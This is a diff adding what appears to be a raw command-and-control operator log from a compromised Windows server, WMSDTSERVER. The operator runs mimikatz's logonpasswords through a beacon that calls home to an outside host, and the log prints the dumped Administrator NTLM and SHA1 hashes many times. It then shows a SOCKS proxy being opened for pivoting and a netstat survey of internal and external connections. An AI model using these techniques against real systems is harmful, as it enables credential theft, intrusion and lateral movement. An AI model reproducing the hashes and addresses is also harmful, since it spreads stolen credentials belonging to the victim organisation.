@@ -1,0 +1,1173 @@
+03/09 01:59:43 UTC [metadata] 222.141.67.133 <- 100.100.1.199; computer: WMSDTSERVER; user: SYSTEM *; process: svchost.exe; pid: 652; os: Windows; version: 6.3; build: 9600; beacon arch: x64 (x64)
+03/09 01:59:53 UTC [input] <user1> sleep 0
+03/09 01:59:53 UTC [task] <T1029> Tasked beacon to become interactive
+03/09 01:59:56 UTC [checkin] host called home, sent: 16 bytes
+03/09 02:00:02 UTC [input] <user1> logonpasswords
+03/09 02:00:02 UTC [task] <T1003, T1055, T1093> Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
+03/09 02:00:02 UTC [checkin] host called home, sent: 296058 bytes
+03/09 02:00:15 UTC [output]
+received output:
+
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2022/3/2 14:30:34
+SID               : S-1-5-17
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 278723094 (00000000:109cfa16)
+Session           : NetworkCleartext from 0
+User Name         : Administrator
+Domain            : WMSDTSERVER
+Logon Server      : WMSDTSERVER
+Logon Time        : 2022/3/8 11:32:09
+SID               : S-1-5-21-3994636827-78984323-26982392-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 2d9268cfbd6ba57d5a2c34a58341872d
+	 * SHA1     : e1acb2d08c928f6b0451befdc2c9f7247cdc360f
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * NTLM     : 2d9268cfbd6ba57d5a2c34a58341872d
+	 * SHA1     : e1acb2d08c928f6b0451befdc2c9f7247cdc360f
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * Password : (null)
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 84436226 (00000000:05086502)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2022/3/4 15:39:44
+SID               : S-1-5-90-3
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WMSDTSERVER$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 279329278 (00000000:10a639fe)
+Session           : NetworkCleartext from 0
+User Name         : Administrator
+Domain            : WMSDTSERVER
+Logon Server      : WMSDTSERVER
+Logon Time        : 2022/3/8 11:49:46
+SID               : S-1-5-21-3994636827-78984323-26982392-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 2d9268cfbd6ba57d5a2c34a58341872d
+	 * SHA1     : e1acb2d08c928f6b0451befdc2c9f7247cdc360f
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * NTLM     : 2d9268cfbd6ba57d5a2c34a58341872d
+	 * SHA1     : e1acb2d08c928f6b0451befdc2c9f7247cdc360f
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * Password : (null)
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 1060483 (00000000:00102e83)
+Session           : Service from 0
+User Name         : Administrator
+Domain            : WMSDTSERVER
+Logon Server      : WMSDTSERVER
+Logon Time        : 2022/3/2 14:52:33
+SID               : S-1-5-21-3994636827-78984323-26982392-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 2d9268cfbd6ba57d5a2c34a58341872d
+	 * SHA1     : e1acb2d08c928f6b0451befdc2c9f7247cdc360f
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * NTLM     : 2d9268cfbd6ba57d5a2c34a58341872d
+	 * SHA1     : e1acb2d08c928f6b0451befdc2c9f7247cdc360f
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * Password : (null)
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 84436245 (00000000:05086515)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2022/3/4 15:39:44
+SID               : S-1-5-90-3
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WMSDTSERVER$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 311173830 (00000000:128c22c6)
+Session           : NetworkCleartext from 0
+User Name         : Administrator
+Domain            : WMSDTSERVER
+Logon Server      : WMSDTSERVER
+Logon Time        : 2022/3/9 6:36:19
+SID               : S-1-5-21-3994636827-78984323-26982392-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 2d9268cfbd6ba57d5a2c34a58341872d
+	 * SHA1     : e1acb2d08c928f6b0451befdc2c9f7247cdc360f
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * NTLM     : 2d9268cfbd6ba57d5a2c34a58341872d
+	 * SHA1     : e1acb2d08c928f6b0451befdc2c9f7247cdc360f
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * Password : (null)
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 205489 (00000000:000322b1)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : WMSDTSERVER
+Logon Server      : WMSDTSERVER
+Logon Time        : 2022/3/2 14:30:36
+SID               : S-1-5-21-3994636827-78984323-26982392-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 2d9268cfbd6ba57d5a2c34a58341872d
+	 * SHA1     : e1acb2d08c928f6b0451befdc2c9f7247cdc360f
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * NTLM     : 2d9268cfbd6ba57d5a2c34a58341872d
+	 * SHA1     : e1acb2d08c928f6b0451befdc2c9f7247cdc360f
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * Password : (null)
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 311174612 (00000000:128c25d4)
+Session           : NetworkCleartext from 0
+User Name         : Administrator
+Domain            : WMSDTSERVER
+Logon Server      : WMSDTSERVER
+Logon Time        : 2022/3/9 6:36:19
+SID               : S-1-5-21-3994636827-78984323-26982392-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 2d9268cfbd6ba57d5a2c34a58341872d
+	 * SHA1     : e1acb2d08c928f6b0451befdc2c9f7247cdc360f
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * NTLM     : 2d9268cfbd6ba57d5a2c34a58341872d
+	 * SHA1     : e1acb2d08c928f6b0451befdc2c9f7247cdc360f
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * Password : (null)
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 279747783 (00000000:10ac9cc7)
+Session           : NetworkCleartext from 0
+User Name         : Administrator
+Domain            : WMSDTSERVER
+Logon Server      : WMSDTSERVER
+Logon Time        : 2022/3/8 12:15:10
+SID               : S-1-5-21-3994636827-78984323-26982392-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 2d9268cfbd6ba57d5a2c34a58341872d
+	 * SHA1     : e1acb2d08c928f6b0451befdc2c9f7247cdc360f
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * NTLM     : 2d9268cfbd6ba57d5a2c34a58341872d
+	 * SHA1     : e1acb2d08c928f6b0451befdc2c9f7247cdc360f
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * Password : (null)
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 74008 (00000000:00012118)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2022/3/2 14:30:18
+SID               : S-1-5-90-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WMSDTSERVER$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WMSDTSERVER$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 2022/3/2 14:30:15
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WMSDTSERVER$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : wmsdtserver$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 278722465 (00000000:109cf7a1)
+Session           : NetworkCleartext from 0
+User Name         : Administrator
+Domain            : WMSDTSERVER
+Logon Server      : WMSDTSERVER
+Logon Time        : 2022/3/8 11:32:09
+SID               : S-1-5-21-3994636827-78984323-26982392-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 2d9268cfbd6ba57d5a2c34a58341872d
+	 * SHA1     : e1acb2d08c928f6b0451befdc2c9f7247cdc360f
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * NTLM     : 2d9268cfbd6ba57d5a2c34a58341872d
+	 * SHA1     : e1acb2d08c928f6b0451befdc2c9f7247cdc360f
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * Password : (null)
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 311173402 (00000000:128c211a)
+Session           : NetworkCleartext from 0
+User Name         : Administrator
+Domain            : WMSDTSERVER
+Logon Server      : WMSDTSERVER
+Logon Time        : 2022/3/9 6:36:19
+SID               : S-1-5-21-3994636827-78984323-26982392-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 2d9268cfbd6ba57d5a2c34a58341872d
+	 * SHA1     : e1acb2d08c928f6b0451befdc2c9f7247cdc360f
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * NTLM     : 2d9268cfbd6ba57d5a2c34a58341872d
+	 * SHA1     : e1acb2d08c928f6b0451befdc2c9f7247cdc360f
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * Password : (null)
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 74028 (00000000:0001212c)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2022/3/2 14:30:18
+SID               : S-1-5-90-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WMSDTSERVER$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 278722549 (00000000:109cf7f5)
+Session           : NetworkCleartext from 0
+User Name         : Administrator
+Domain            : WMSDTSERVER
+Logon Server      : WMSDTSERVER
+Logon Time        : 2022/3/8 11:32:09
+SID               : S-1-5-21-3994636827-78984323-26982392-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 2d9268cfbd6ba57d5a2c34a58341872d
+	 * SHA1     : e1acb2d08c928f6b0451befdc2c9f7247cdc360f
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * NTLM     : 2d9268cfbd6ba57d5a2c34a58341872d
+	 * SHA1     : e1acb2d08c928f6b0451befdc2c9f7247cdc360f
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * Password : (null)
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : WMSDTSERVER
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2022/3/2 14:30:18
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WMSDTSERVER$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 2022/3/2 14:30:17
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WMSDTSERVER$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : wmsdtserver$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 51267 (00000000:0000c843)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2022/3/2 14:30:15
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+
+03/09 02:01:30 UTC [checkin] host called home, sent: 1522 bytes
+03/09 02:01:30 UTC [error] relocation truncated to fit (distance between executable code and other data is >4GB)
+03/09 02:01:57 UTC [checkin] host called home, sent: 1522 bytes
+03/09 02:01:57 UTC [error] relocation truncated to fit (distance between executable code and other data is >4GB)
+03/09 02:09:23 UTC [input] <user1> socks 64577
+03/09 02:09:23 UTC [output]
+started SOCKS4a server on: 64577
+
+03/09 02:09:23 UTC [checkin] host called home, sent: 16 bytes
+03/09 02:18:18 UTC [input] <user1> shell netstat -ano
+03/09 02:18:18 UTC [task] <T1059> Tasked beacon to run: netstat -ano
+03/09 02:18:18 UTC [checkin] host called home, sent: 43 bytes
+03/09 02:18:33 UTC [output]
+received output:
+
+活动连接
+
+  协议  本地地址          外部地址        状态           PID
+  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       2536
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       964
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:800            0.0.0.0:0              LISTENING       1472
+  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       7144
+  TCP    0.0.0.0:1801           0.0.0.0:0              LISTENING       2988
+  TCP    0.0.0.0:2103           0.0.0.0:0              LISTENING       2988
+  TCP    0.0.0.0:2105           0.0.0.0:0              LISTENING       2988
+  TCP    0.0.0.0:2107           0.0.0.0:0              LISTENING       2988
+  TCP    0.0.0.0:3196           0.0.0.0:0              LISTENING       5668
+  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       3704
+  TCP    0.0.0.0:5222           0.0.0.0:0              LISTENING       2600
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:6001           0.0.0.0:0              LISTENING       2600
+  TCP    0.0.0.0:6002           0.0.0.0:0              LISTENING       2600
+  TCP    0.0.0.0:7776           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:7777           0.0.0.0:0              LISTENING       2092
+  TCP    0.0.0.0:7778           0.0.0.0:0              LISTENING       1532
+  TCP    0.0.0.0:7779           0.0.0.0:0              LISTENING       1532
+  TCP    0.0.0.0:8010           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:8020           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:8088           0.0.0.0:0              LISTENING       1404
+  TCP    0.0.0.0:20200          0.0.0.0:0              LISTENING       6388
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       776
+  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       552
+  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       1364
+  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       868
+  TCP    0.0.0.0:49160          0.0.0.0:0              LISTENING       2988
+  TCP    0.0.0.0:49348          0.0.0.0:0              LISTENING       840
+  TCP    0.0.0.0:49349          0.0.0.0:0              LISTENING       6536
+  TCP    0.0.0.0:53047          0.0.0.0:0              LISTENING       2128
+  TCP    100.100.1.199:139      0.0.0.0:0              LISTENING       4
+  TCP    100.100.1.199:1433     100.100.1.199:55918    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:57805    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:60829    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:61955    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:61956    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:61957    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:61958    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:61961    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:61962    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:61963    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:61964    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:61965    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:62706    TIME_WAIT       0
+  TCP    100.100.1.199:1433     100.100.1.199:63585    TIME_WAIT       0
+  TCP    100.100.1.199:1433     100.100.1.200:52695    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.200:52696    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.200:52697    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.200:52698    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.200:52700    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.200:52727    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.200:53483    ESTABLISHED     7144
+  TCP    100.100.1.199:7776     42.232.243.182:13491   ESTABLISHED     4
+  TCP    100.100.1.199:7776     192.168.13.44:2354     ESTABLISHED     4
+  TCP    100.100.1.199:7776     192.168.13.44:2355     ESTABLISHED     4
+  TCP    100.100.1.199:7776     192.168.13.44:2356     ESTABLISHED     4
+  TCP    100.100.1.199:7776     222.141.67.133:24925   ESTABLISHED     4
+  TCP    100.100.1.199:7777     36.113.9.63:30369      ESTABLISHED     2092
+  TCP    100.100.1.199:7777     42.232.246.217:20029   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     42.232.246.217:20030   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     42.232.246.217:20040   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     42.232.247.91:7296     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     61.158.231.176:23174   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.62.234:10913     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.62.234:10977     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.62.234:13153     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.62.234:25057     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.62.234:25153     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.62.234:25953     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.62.234:31137     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.62.234:57089     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.62.234:57121     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.62.234:57249     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.111.63:5337      ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.111.63:7813      ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.111.63:31291     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.13.67.192:14372    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.13.67.192:14874    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.13.67.192:14877    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.13.94.146:9783     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.15.1.108:5663      ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.15.1.108:7598      ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.15.1.108:17294     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.15.1.108:28100     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.15.1.108:29097     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     182.118.237.93:29485   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     182.120.152.172:65024  ESTABLISHED     2092
+  TCP    100.100.1.199:7777     182.123.145.151:29215  ESTABLISHED     2092
+  TCP    100.100.1.199:7777     182.123.146.217:8289   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     182.123.147.201:34171  ESTABLISHED     2092
+  TCP    100.100.1.199:7777     182.123.151.80:42246   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     182.123.169.201:55778  ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.55:50371     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.55:50372     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.55:50374     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.55:50476     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.55:50477     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.72:1100      ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.72:1101      ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.72:1103      ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.80:64679     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.80:64680     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.80:64683     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.105:49170    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.105:49171    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.105:49174    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.105:49443    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.105:49444    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.161:55125    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.161:55126    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.161:55128    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.216:49430    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.216:49431    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.216:49433    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.11.119:3756    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.11.119:3758    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.11.119:9771    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.11.250:49926   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.11.250:49927   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.11.250:49931   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.12.163:63224   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.37:49236    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.37:49237    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.37:49246    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.59:51129    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.59:56227    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.59:56228    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.99:1199     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.99:1203     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.99:1575     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.103:3879    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.103:3880    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.103:3883    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.109:65442   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.116:61861   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.158:50047   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.158:50048   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.158:50052   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.248:55853   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.248:60036   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.248:60037   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.20.100:49644   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.20.100:49645   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.20.100:49652   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.20.244:1559    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.20.244:3588    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.20.244:3592    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.20.249:54302   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.20.249:54303   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.20.249:54305   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.20.249:54475   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.20.249:54477   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.27.13:58641    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.30.15:50131    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.30.49:59027    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.30.100:52500   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.30.100:53160   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.30.100:53172   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.30.227:1033    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.30.227:1487    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.30.227:1488    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.30.228:2630    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.30.228:2631    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.30.228:2655    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     218.28.58.186:29143    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     222.141.67.133:7313    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     222.141.67.133:8401    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     222.141.67.133:23435   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     222.141.67.133:28024   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     222.141.67.133:32551   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     222.141.67.133:33278   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     222.141.67.133:33909   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     222.141.67.133:50480   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     222.141.67.133:53243   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     222.141.67.133:57070   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     222.141.67.133:64260   ESTABLISHED     2092
+  TCP    100.100.1.199:7778     8.142.113.226:38922    CLOSE_WAIT      1532
+  TCP    100.100.1.199:7778     8.142.113.226:51954    CLOSE_WAIT      1532
+  TCP    100.100.1.199:7778     8.142.113.226:58834    CLOSE_WAIT      1532
+  TCP    100.100.1.199:49188    120.52.183.190:80      CLOSE_WAIT      6012
+  TCP    100.100.1.199:49215    111.202.1.250:5222     ESTABLISHED     6012
+  TCP    100.100.1.199:49230    116.181.3.49:80        CLOSE_WAIT      6012
+  TCP    100.100.1.199:49280    116.181.3.49:80        CLOSE_WAIT      6012
+  TCP    100.100.1.199:50760    116.181.3.49:80        CLOSE_WAIT      6012
+  TCP    100.100.1.199:52285    47.114.83.166:80       ESTABLISHED     6024
